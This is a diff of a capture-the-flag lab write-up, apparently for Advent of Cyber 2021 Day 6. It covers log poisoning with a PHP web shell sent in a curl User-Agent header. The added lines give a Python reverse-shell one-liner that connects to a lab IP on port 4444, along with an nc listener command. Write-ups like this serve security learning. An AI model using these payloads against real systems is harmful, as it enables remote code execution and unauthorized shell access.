@@ -202,7 +202,7 @@ This will happen in stages. First, we want to ensure the backdoor will work. Sta
 
 > You may want to clear the logs again for a fresh start. 
 
-`curl -A "<?php echo '       n0_ware on your server    ';system(\$_GET['cmd']);?>" aoc6.com/index.php`
+`curl -A "<?php echo 'n0_ware on your server    ';system(\$_GET['cmd']);?>" aoc6.com/index.php`
 
 To break this down....
 - `echo` will tell the system to print some random value to know that we have code execution
@@ -215,7 +215,7 @@ To break this down....
 Check the logs to see what happened. Note that for whatever reason, my box was picking up three logs each time I refresh the page, making it a bit hard to find our commands. 
 
 ![Blank Command Failure](AoC-2021_Photos/Day_6/22.0_AoC-Day-6_12-24-21-Blank-Command-Execution.png)
-</br>
+
 
 Not only was our text executed, but we got a **good** error. The error tells us blank code failed to execute. This is because we passed a parameter, `['cmd']`, but did not provide a command. Head to the URL bar and at the very end, add `&cmd=whoami` to provide a command. The backdoor we entered earlier will substitute `whoami` for `cmd`. 
 
@@ -230,7 +230,14 @@ This is really messy, however. Let's create our own back door file. Instead of `
 
 > The extra spaces are intentional
 
+NONE OF THESE THINGS WORKED SO RCE WITH
 
+```
+python -c 'a=__import__;b=a("socket");p=a("subprocess").call;o=a("os").dup2;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect(("10.2.58.140",4444));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p(["/bin/sh","-i"])'
+```
+
+Got from payload all the things
+and a listeneder `nc -lvnp 4444`
 
 After curling this command, we are going to use [path traversal](../../../knowledge-base/vulnerabilities/path_traversal.md) to access `app_access.log` directly from the web root. 
 
